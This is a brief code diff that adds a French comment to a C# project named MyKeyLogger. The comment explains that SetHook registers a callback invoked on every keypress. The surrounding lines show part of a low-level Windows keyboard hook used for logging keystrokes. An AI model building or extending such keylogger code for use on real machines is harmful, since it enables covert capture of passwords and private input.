@@ -112,6 +112,7 @@ namespace MyKeyLogger
 
         private static LowLevelKeyboardProc proc = HookCallback;
         
+        // Permet d'enregistrer un rappel à appeler, proc, qui sera appelée à chaque pression de touche.
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
